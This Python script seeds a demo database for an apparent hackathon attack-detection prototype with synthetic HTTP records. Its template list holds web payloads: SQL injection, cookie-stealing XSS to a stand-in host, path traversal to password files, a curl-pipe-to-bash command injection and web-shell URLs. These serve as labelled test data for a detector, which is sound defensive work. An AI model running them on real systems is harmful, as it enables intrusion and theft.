# -*- coding: utf-8 -*-
"""
seed_demo_data.py
=================
URL-Based Cyber Attack Detection & IP Intelligence System
DEMO PROTOTYPE

Generates ~500 synthetic HTTP request records covering all 11 attack types
plus normal/benign traffic, and populates the SQLite demo database.

⚠ DISCLAIMER: All data is FICTIONAL.
  - IPs use RFC 1918 private ranges (10.x, 172.16.x, 192.168.x)
  - No real IPDR, credentials, victims, or government data
  - For hackathon demo / prototype use only

Usage:
    cd database/
    python seed_demo_data.py [--db PATH] [--records N] [--verbose]

Arguments:
    --db        Path to the SQLite database file  (default: ../backend/demo.db)
    --records   Total number of records to seed   (default: 500)
    --verbose   Print progress to stdout
"""

import argparse
import json
import random
import sqlite3
import sys
from datetime import datetime, timedelta

# ─────────────────────────────────────────────────────────────────────────────
# Default path — backend lives one level up from database/
# ─────────────────────────────────────────────────────────────────────────────
DEFAULT_DB = "../backend/demo.db"

# ─────────────────────────────────────────────────────────────────────────────
# Synthetic IP pools  (RFC 1918 — all fictional)
# ─────────────────────────────────────────────────────────────────────────────
ATTACKER_IPS = [
    "10.0.0.5",  "10.0.0.12",  "10.0.0.23",  "10.0.0.77",
    "192.168.1.10", "192.168.1.55", "192.168.2.3", "192.168.3.99",
    "172.16.0.8",   "172.16.1.15",  "172.16.5.200",
    "10.10.1.1",    "10.10.1.50",
]

VICTIM_IPS = [
    "192.168.100.1", "192.168.100.5", "10.10.0.1",
    "192.168.200.10", "10.20.0.5",
]

# Simulated geo pool — clearly labelled SIMULATED
GEO_POOL = [
    ("Simulated-Country-A", "Simulated-City-1", "Simulated ISP Alpha"),
    ("Simulated-Country-B", "Simulated-City-2", "Simulated ISP Beta"),
    ("Simulated-Country-C", "Simulated-City-3", "Simulated ISP Gamma"),
    ("Simulated-Country-D", "Simulated-City-4", "Simulated ISP Delta"),
    ("Simulated-Country-E", "Simulated-City-5", "Simulated ISP Epsilon"),
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) Safari/605.1.15",
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
    "Hydra/9.4 (https://github.com/vanhauser-thc/thc-hydra)",
    "WFuzz/3.1.0",
    "Go-http-client/1.1",
]

# ─────────────────────────────────────────────────────────────────────────────
# Attack template pool
# Each entry: url, method, status_code, attack_type, severity, confidence, result
# Optionally: host (for typosquatting)
# ─────────────────────────────────────────────────────────────────────────────
ATTACK_TEMPLATES = [

    # ── SQL Injection ─────────────────────────────────────────────────────
    {"url": "/search?q=' OR 1=1--", "method": "GET", "status_code": 500,
     "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.97, "result": "ATTEMPT"},
    {"url": "/api/user?id=1 UNION SELECT username,password FROM users--", "method": "GET",
     "status_code": 200, "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.99,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/login?user=admin' AND 1=1--&pass=x", "method": "POST", "status_code": 403,
     "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.92, "result": "ATTEMPT"},
    {"url": "/products?cat=1;DROP TABLE products--", "method": "GET", "status_code": 500,
     "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.95, "result": "ATTEMPT"},
    {"url": "/report?id=1 AND SLEEP(5)--", "method": "GET", "status_code": 200,
     "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.93,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/api/orders?filter=1' OR '1'='1", "method": "GET", "status_code": 200,
     "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.91,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/items?id=1; EXEC xp_cmdshell('whoami')--", "method": "GET", "status_code": 500,
     "attack_type": "SQL Injection", "severity": "CRITICAL", "confidence": 0.98, "result": "ATTEMPT"},

    # ── XSS ──────────────────────────────────────────────────────────────
    {"url": "/search?q=<script>alert('xss')</script>", "method": "GET", "status_code": 200,
     "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.88,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/comment?text=<img src=x onerror=alert(document.cookie)>", "method": "POST",
     "status_code": 200, "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.91,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/profile?name=<svg onload=fetch('http://evil.sim/'+document.cookie)>", "method": "GET",
     "status_code": 200, "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.85,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "method": "GET",
     "status_code": 400, "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.82,
     "result": "ATTEMPT"},
    {"url": "/review?body=<iframe src=javascript:alert('xss')></iframe>", "method": "POST",
     "status_code": 200, "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.87,
     "result": "POTENTIAL_SUCCESS"},

    # ── Directory Traversal ───────────────────────────────────────────────
    {"url": "/files/../../../etc/passwd", "method": "GET", "status_code": 200,
     "attack_type": "Directory Traversal", "severity": "HIGH", "confidence": 0.96,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/download?file=../../../../boot.ini", "method": "GET", "status_code": 404,
     "attack_type": "Directory Traversal", "severity": "HIGH", "confidence": 0.90,
     "result": "ATTEMPT"},
    {"url": "/img?path=..%2F..%2F..%2Fetc%2Fshadow", "method": "GET", "status_code": 403,
     "attack_type": "Directory Traversal", "severity": "HIGH", "confidence": 0.88,
     "result": "ATTEMPT"},
    {"url": "/view?file=....//....//etc/passwd", "method": "GET", "status_code": 200,
     "attack_type": "Directory Traversal", "severity": "HIGH", "confidence": 0.94,
     "result": "POTENTIAL_SUCCESS"},

    # ── Command Injection ─────────────────────────────────────────────────
    {"url": "/ping?host=127.0.0.1;whoami", "method": "GET", "status_code": 200,
     "attack_type": "Command Injection", "severity": "CRITICAL", "confidence": 0.98,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/util/convert?file=test.txt&&cat /etc/passwd", "method": "POST",
     "status_code": 500, "attack_type": "Command Injection", "severity": "CRITICAL",
     "confidence": 0.94, "result": "ATTEMPT"},
    {"url": "/run?cmd=$(curl http://10.0.0.99/shell.sh | bash)", "method": "GET",
     "status_code": 200, "attack_type": "Command Injection", "severity": "CRITICAL",
     "confidence": 0.99, "result": "POTENTIAL_SUCCESS"},
    {"url": "/dns?host=simulated.internal`id`", "method": "GET", "status_code": 200,
     "attack_type": "Command Injection", "severity": "CRITICAL", "confidence": 0.96,
     "result": "POTENTIAL_SUCCESS"},

    # ── SSRF ─────────────────────────────────────────────────────────────
    {"url": "/api/proxy?url=http://169.254.169.254/latest/meta-data/", "method": "GET",
     "status_code": 200, "attack_type": "SSRF", "severity": "HIGH", "confidence": 0.97,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/fetch?target=http://localhost:8080/admin", "method": "GET",
     "status_code": 403, "attack_type": "SSRF", "severity": "HIGH", "confidence": 0.88,
     "result": "ATTEMPT"},
    {"url": "/webhook?callback=http://192.168.1.1/internal", "method": "POST",
     "status_code": 200, "attack_type": "SSRF", "severity": "HIGH", "confidence": 0.91,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/image?src=file:///etc/passwd", "method": "GET", "status_code": 200,
     "attack_type": "SSRF", "severity": "HIGH", "confidence": 0.89,
     "result": "POTENTIAL_SUCCESS"},

    # ── Brute Force ───────────────────────────────────────────────────────
    {"url": "/login", "method": "POST", "status_code": 401,
     "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.85, "result": "ATTEMPT"},
    {"url": "/login", "method": "POST", "status_code": 200,
     "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.92,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/wp-login.php", "method": "POST", "status_code": 401,
     "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.87, "result": "ATTEMPT"},
    {"url": "/admin/login", "method": "POST", "status_code": 401,
     "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.83, "result": "ATTEMPT"},
    {"url": "/api/v1/auth/token", "method": "POST", "status_code": 401,
     "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.86, "result": "ATTEMPT"},

    # ── Credential Stuffing ───────────────────────────────────────────────
    {"url": "/login", "method": "POST", "status_code": 401,
     "attack_type": "Credential Stuffing", "severity": "HIGH", "confidence": 0.82,
     "result": "ATTEMPT"},
    {"url": "/api/auth", "method": "POST", "status_code": 200,
     "attack_type": "Credential Stuffing", "severity": "HIGH", "confidence": 0.89,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/account/login", "method": "POST", "status_code": 200,
     "attack_type": "Credential Stuffing", "severity": "HIGH", "confidence": 0.84,
     "result": "POTENTIAL_SUCCESS"},

    # ── XXE ───────────────────────────────────────────────────────────────
    {"url": "/api/xml", "method": "POST", "status_code": 200,
     "attack_type": "XXE", "severity": "HIGH", "confidence": 0.93,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/parse?xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
     "method": "POST", "status_code": 500,
     "attack_type": "XXE", "severity": "HIGH", "confidence": 0.90, "result": "ATTEMPT"},

    # ── Web Shell ─────────────────────────────────────────────────────────
    {"url": "/uploads/shell.php?cmd=id", "method": "GET", "status_code": 200,
     "attack_type": "Web Shell", "severity": "CRITICAL", "confidence": 0.99,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/images/c99.php?exec=ls -la /var/www", "method": "GET", "status_code": 200,
     "attack_type": "Web Shell", "severity": "CRITICAL", "confidence": 0.98,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/backdoor.asp?cmd=whoami", "method": "GET", "status_code": 200,
     "attack_type": "Web Shell", "severity": "CRITICAL", "confidence": 0.97,
     "result": "POTENTIAL_SUCCESS"},
    {"url": "/assets/r57.php?pass=simulated&cmd=uname+-a", "method": "GET",
     "status_code": 200, "attack_type": "Web Shell", "severity": "CRITICAL",
     "confidence": 0.96, "result": "POTENTIAL_SUCCESS"},

    # ── Typosquatting (host-based) ─────────────────────────────────────────
    {"url": "/", "method": "GET", "status_code": 200, "host": "paypa1.sim",
     "attack_type": "Typosquatting", "severity": "MEDIUM", "confidence": 0.78, "result": "ATTEMPT"},
    {"url": "/login", "method": "GET", "status_code": 200, "host": "g00gle.sim",
     "attack_type": "Typosquatting", "severity": "MEDIUM", "confidence": 0.82, "result": "ATTEMPT"},
    {"url": "/account", "method": "GET", "status_code": 200, "host": "amaz0n.sim",
     "attack_type": "Typosquatting", "severity": "MEDIUM", "confidence": 0.80, "result": "ATTEMPT"},
    {"url": "/signin", "method": "GET", "status_code": 200, "host": "micros0ft.sim",
     "attack_type": "Typosquatting", "severity": "MEDIUM", "confidence": 0.75, "result": "ATTEMPT"},

    # ── HTTP Parameter Pollution ─────────────────────────────────────────
    {"url": "/search?q=safe&q=<script>alert(1)</script>", "method": "GET",
     "status_code": 200, "attack_type": "HTTP Parameter Pollution",
     "severity": "MEDIUM", "confidence": 0.78, "result": "POTENTIAL_SUCCESS"},
    {"url": "/api?action=view&action=delete&id=42", "method": "GET",
     "status_code": 200, "attack_type": "HTTP Parameter Pollution",
     "severity": "MEDIUM", "confidence": 0.75, "result": "ATTEMPT"},
]

BENIGN_URLS = [
    "/index.html", "/about", "/contact", "/products", "/api/health",
    "/favicon.ico", "/static/app.js", "/api/user/profile", "/dashboard",
    "/settings", "/blog", "/news", "/help", "/faq", "/api/catalog",
    "/search?q=laptop", "/cart", "/checkout", "/api/orders", "/profile",
    "/terms", "/privacy", "/api/notifications", "/logout", "/signup",
]

# ─────────────────────────────────────────────────────────────────────────────
# Risk scoring  (mirrors backend/risk/scorer.py)
# ─────────────────────────────────────────────────────────────────────────────
ATTACK_POINTS = {
    "SQL Injection": 30,
    "Directory Traversal": 30,
    "Command Injection": 35,
    "XSS": 20,
    "Brute Force": 25,
    "SSRF": 35,
    "LFI/RFI": 30,
    "XXE": 30,
    "Web Shell": 40,
    "Typosquatting": 20,
    "HTTP Parameter Pollution": 10,
    "Credential Stuffing": 25,
}
POTENTIAL_SUCCESS_BONUS = 40
HIGH_REQUEST_RATE_BONUS = 15


def get_risk_level(score: int) -> str:
    if score <= 20:
        return "LOW"
    if score <= 50:
        return "MEDIUM"
    if score <= 100:
        return "HIGH"
    return "CRITICAL"


def calculate_risk_score(detections: list, request_count: int = 0) -> dict:
    score = 0
    seen: set = set()
    for d in detections:
        atype = d.get("attack_type", "")
        if atype not in seen:
            score += ATTACK_POINTS.get(atype, 10)
            seen.add(atype)
        if d.get("result") == "POTENTIAL_SUCCESS":
            score += POTENTIAL_SUCCESS_BONUS
    if request_count > 100:
        score += HIGH_REQUEST_RATE_BONUS
    return {"risk_score": score, "risk_level": get_risk_level(score)}


# ─────────────────────────────────────────────────────────────────────────────
# Main seeding logic
# ─────────────────────────────────────────────────────────────────────────────

def seed(db_path: str, target_records: int = 500, verbose: bool = False) -> None:
    """
    Connect to SQLite, create schema if needed, and insert synthetic data.
    Safe to call on a fresh DB — aborts if data already exists.
    """
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()

    # Enable foreign keys
    cur.execute("PRAGMA foreign_keys = ON")

    # ── Create tables from embedded DDL (idempotent) ─────────────────────
    _create_schema(cur)
    conn.commit()

    # ── Guard: skip if already seeded ────────────────────────────────────
    existing = cur.execute("SELECT COUNT(*) FROM requests").fetchone()[0]
    if existing > 0:
        print(f"[SEED] Database already contains {existing} request records — skipping seed.")
        print("[SEED] Run reset_demo_database.py first to clear the database.")
        conn.close()
        return

    rng = random.Random(42)  # fixed seed for reproducible demos
    now = datetime.utcnow()
    base_time = now - timedelta(hours=8)

    # ── Create seed upload record ─────────────────────────────────────────
    attack_count = len(ATTACK_TEMPLATES)
    benign_count = target_records - attack_count
    if benign_count < 0:
        benign_count = 0

    cur.execute(
        """INSERT INTO uploads
           (filename, file_type, status, total_records, records_processed,
            attacks_detected, high_risk_ips, upload_time)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
        (
            "demo_seed_data.csv", "csv", "completed",
            attack_count + benign_count,
            attack_count + benign_count,
            attack_count,
            5,  # estimated; updated below
            base_time.isoformat(),
        )
    )
    upload_id = cur.lastrowid
    if verbose:
        print(f"[SEED] Created upload record id={upload_id}")

    # ── Track per-IP stats for ip_analysis ────────────────────────────────
    ip_detections: dict[str, list] = {}
    ip_request_counts: dict[str, int] = {}

    # ── 1. Insert attack records ──────────────────────────────────────────
    for i, tmpl in enumerate(ATTACK_TEMPLATES):
        src_ip = rng.choice(ATTACKER_IPS)
        dst_ip = rng.choice(VICTIM_IPS)
        ts = (base_time + timedelta(minutes=i * 3 + rng.randint(0, 4))).isoformat()

        cur.execute(
            """INSERT INTO requests
               (timestamp, source_ip, destination_ip, method, host, url,
                user_agent, status_code, response_size, upload_id)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                ts,
                src_ip,
                dst_ip,
                tmpl.get("method", "GET"),
                tmpl.get("host", "demo.internal"),
                tmpl["url"],
                rng.choice(USER_AGENTS),
                tmpl["status_code"],
                rng.randint(200, 50_000),
                upload_id,
            )
        )
        req_id = cur.lastrowid

        cur.execute(
            """INSERT INTO detections
               (request_id, attack_type, severity, confidence,
                detection_method, result, source_ip, url, host)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                req_id,
                tmpl["attack_type"],
                tmpl["severity"],
                tmpl["confidence"],
                "RULE",
                tmpl["result"],
                src_ip,
                tmpl["url"],
                tmpl.get("host", "demo.internal"),
            )
        )

        ip_request_counts[src_ip] = ip_request_counts.get(src_ip, 0) + 1
        ip_detections.setdefault(src_ip, []).append({
            "attack_type": tmpl["attack_type"],
            "result": tmpl["result"],
        })

    if verbose:
        print(f"[SEED] Inserted {len(ATTACK_TEMPLATES)} attack records")

    # ── 2. Insert benign traffic ──────────────────────────────────────────
    all_ips = ATTACKER_IPS + ["10.0.1.1", "10.0.1.2", "172.16.5.5",
                               "10.50.0.1", "192.168.50.10"]
    for j in range(benign_count):
        src_ip = rng.choice(all_ips)
        ts = (base_time + timedelta(minutes=j + rng.randint(0, 3))).isoformat()

        cur.execute(
            """INSERT INTO requests
               (timestamp, source_ip, destination_ip, method, host, url,
                user_agent, status_code, response_size, upload_id)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                ts,
                src_ip,
                rng.choice(VICTIM_IPS),
                rng.choice(["GET", "POST"]),
                "demo.internal",
                rng.choice(BENIGN_URLS),
                rng.choice(USER_AGENTS),
                rng.choice([200, 200, 200, 301, 304, 404]),
                rng.randint(500, 20_000),
                upload_id,
            )
        )
        ip_request_counts[src_ip] = ip_request_counts.get(src_ip, 0) + 1

    if verbose:
        print(f"[SEED] Inserted {benign_count} benign records")

    # ── 3. Build ip_analysis rows ─────────────────────────────────────────
    high_risk_count = 0
    geo_pool = GEO_POOL

    # IPs with attacks
    for ip, dets in ip_detections.items():
        risk = calculate_risk_score(dets, request_count=ip_request_counts.get(ip, 0))
        attack_types = list({d["attack_type"] for d in dets})
        geo = rng.choice(geo_pool)

        cur.execute(
            """INSERT INTO ip_analysis
               (ip, total_requests, attack_count, attack_types, risk_score,
                risk_level, first_seen, last_seen,
                geo_country, geo_city, isp)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                ip,
                ip_request_counts.get(ip, 0),
                len(dets),
                json.dumps(attack_types),
                risk["risk_score"],
                risk["risk_level"],
                base_time.isoformat(),
                now.isoformat(),
                geo[0], geo[1], geo[2],
            )
        )
        if risk["risk_level"] in ("HIGH", "CRITICAL"):
            high_risk_count += 1

    # IPs with only benign traffic
    benign_only = set(all_ips) - set(ip_detections.keys())
    for ip in benign_only:
        if ip_request_counts.get(ip, 0) > 0:
            geo = rng.choice(geo_pool)
            cur.execute(
                """INSERT OR IGNORE INTO ip_analysis
                   (ip, total_requests, attack_count, attack_types,
                    risk_score, risk_level, first_seen, last_seen,
                    geo_country, geo_city, isp)
                   VALUES (?, ?, 0, '[]', 0, 'LOW', ?, ?, ?, ?, ?)""",
                (
                    ip,
                    ip_request_counts.get(ip, 0),
                    base_time.isoformat(),
                    now.isoformat(),
                    geo[0], geo[1], geo[2],
                )
            )

    # Update high_risk_ips count on the upload record
    cur.execute(
        "UPDATE uploads SET high_risk_ips = ? WHERE id = ?",
        (high_risk_count, upload_id)
    )

    conn.commit()
    conn.close()

    total_inserted = len(ATTACK_TEMPLATES) + benign_count
    print(f"[SEED] Done. Inserted {total_inserted} requests "
          f"({len(ATTACK_TEMPLATES)} attacks, {benign_count} benign)")
    print(f"[SEED] High/Critical risk IPs: {high_risk_count}")
    print(f"[SEED] Database: {db_path}")


# ─────────────────────────────────────────────────────────────────────────────
# Embedded minimal DDL  (no external schema.sql dependency needed)
# ─────────────────────────────────────────────────────────────────────────────

def _create_schema(cur: sqlite3.Cursor) -> None:
    """Create tables and indexes if they don't already exist."""
    cur.executescript("""
        PRAGMA foreign_keys = ON;

        CREATE TABLE IF NOT EXISTS uploads (
            id                  INTEGER PRIMARY KEY AUTOINCREMENT,
            filename            TEXT    NOT NULL,
            file_type           TEXT    NOT NULL,
            status              TEXT    NOT NULL DEFAULT 'pending',
            total_records       INTEGER DEFAULT 0,
            records_processed   INTEGER DEFAULT 0,
            attacks_detected    INTEGER DEFAULT 0,
            high_risk_ips       INTEGER DEFAULT 0,
            upload_time         TEXT    DEFAULT (datetime('now')),
            error_message       TEXT
        );

        CREATE TABLE IF NOT EXISTS requests (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp       TEXT,
            source_ip       TEXT    NOT NULL,
            destination_ip  TEXT,
            method          TEXT,
            host            TEXT,
            url             TEXT,
            user_agent      TEXT,
            status_code     INTEGER,
            response_size   INTEGER,
            upload_id       INTEGER REFERENCES uploads(id) ON DELETE SET NULL
        );

        CREATE INDEX IF NOT EXISTS idx_requests_source_ip ON requests(source_ip);
        CREATE INDEX IF NOT EXISTS idx_requests_timestamp  ON requests(timestamp);
        CREATE INDEX IF NOT EXISTS idx_requests_upload_id  ON requests(upload_id);

        CREATE TABLE IF NOT EXISTS detections (
            id                  INTEGER PRIMARY KEY AUTOINCREMENT,
            request_id          INTEGER NOT NULL REFERENCES requests(id) ON DELETE CASCADE,
            attack_type         TEXT    NOT NULL,
            severity            TEXT    NOT NULL,
            confidence          REAL    NOT NULL,
            detection_method    TEXT    NOT NULL,
            result              TEXT    NOT NULL,
            created_at          TEXT    DEFAULT (datetime('now')),
            source_ip           TEXT,
            url                 TEXT,
            host                TEXT
        );

        CREATE INDEX IF NOT EXISTS idx_detections_request_id       ON detections(request_id);
        CREATE INDEX IF NOT EXISTS idx_detections_attack_type      ON detections(attack_type);
        CREATE INDEX IF NOT EXISTS idx_detections_severity         ON detections(severity);
        CREATE INDEX IF NOT EXISTS idx_detections_source_ip        ON detections(source_ip);
        CREATE INDEX IF NOT EXISTS idx_detections_result           ON detections(result);
        CREATE INDEX IF NOT EXISTS idx_detections_created_at       ON detections(created_at);
        CREATE INDEX IF NOT EXISTS idx_detections_detection_method ON detections(detection_method);

        CREATE TABLE IF NOT EXISTS ip_analysis (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            ip              TEXT    NOT NULL UNIQUE,
            total_requests  INTEGER DEFAULT 0,
            attack_count    INTEGER DEFAULT 0,
            attack_types    TEXT    DEFAULT '[]',
            risk_score      INTEGER DEFAULT 0,
            risk_level      TEXT    NOT NULL DEFAULT 'LOW',
            first_seen      TEXT    DEFAULT (datetime('now')),
            last_seen       TEXT,
            geo_country     TEXT    DEFAULT 'Simulated',
            geo_city        TEXT    DEFAULT 'Simulated',
            isp             TEXT    DEFAULT 'Simulated ISP',
            updated_at      TEXT    DEFAULT (datetime('now'))
        );

        CREATE INDEX IF NOT EXISTS idx_ip_risk_level ON ip_analysis(risk_level);
        CREATE INDEX IF NOT EXISTS idx_ip_risk_score ON ip_analysis(risk_score);
    """)


# ─────────────────────────────────────────────────────────────────────────────
# CLI entry point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Seed the demo SQLite database with synthetic HTTP/attack records."
    )
    parser.add_argument(
        "--db",
        default=DEFAULT_DB,
        help=f"Path to the SQLite .db file (default: {DEFAULT_DB})",
    )
    parser.add_argument(
        "--records",
        type=int,
        default=500,
        help="Total records to generate (default: 500, min: ~45 attack templates)",
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Print detailed progress",
    )
    args = parser.parse_args()

    print(f"[SEED] Target DB : {args.db}")
    print(f"[SEED] Records   : {args.records}")
    print("[SEED] WARNING: All data is SYNTHETIC - no real IPDR or credentials")
    print()

    try:
        seed(args.db, target_records=args.records, verbose=args.verbose)
    except Exception as exc:
        print(f"[SEED] ERROR: {exc}", file=sys.stderr)
        sys.exit(1)
